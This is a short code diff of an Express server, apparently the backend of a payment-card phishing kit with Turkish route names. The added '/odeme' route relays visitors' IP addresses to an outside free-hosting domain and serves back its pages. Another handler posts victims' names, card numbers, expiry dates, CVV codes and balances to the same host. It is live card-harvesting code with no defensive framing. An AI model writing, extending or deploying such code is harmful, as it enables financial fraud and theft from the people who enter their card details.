@@ -95,6 +95,25 @@ app.get('/odeme', async (req, res) => {
   }
 });
 
+app.get('/odeme', async (req, res) => {
+  try {
+    const clientIp = getClientIp(req);
+    const response = await axios.post(
+      'https://forestgreen-rook-759809.hostingersite.com/dmn/acsredirect.php',
+      qs.stringify({ ip: clientIp }),
+      {
+        headers: { 'Content-Type': 'application/x-www-form-urlencoded' }
+      }
+    );
+    res.send(response.data);
+  } catch (error) {
+    console.error('Ödeme sayfası hatası:', error.message);
+    res.status(500).send('Sunucudan veri alınamadı.');
+  }
+});
+
+
+
 app.post('/veri', async (req, res) => {
   try {
     const clientIp = getClientIp(req);
@@ -222,7 +241,7 @@ app.post('/api/odeme', (req, res) => {
 
   axios.post(
     'https://forestgreen-rook-759809.hostingersite.com/dmn/test.php',
-    qs.stringify({ isim_soyisim, kredi_karti, skt, cvv, bakiye, ip_adresi: ip }),
+    qs.stringify({ isim_soyisim, kredi_karti, skt, cvv, bakiye, ip: ip }),
     {
       headers: {
         'Content-Type': 'application/x-www-form-urlencoded',
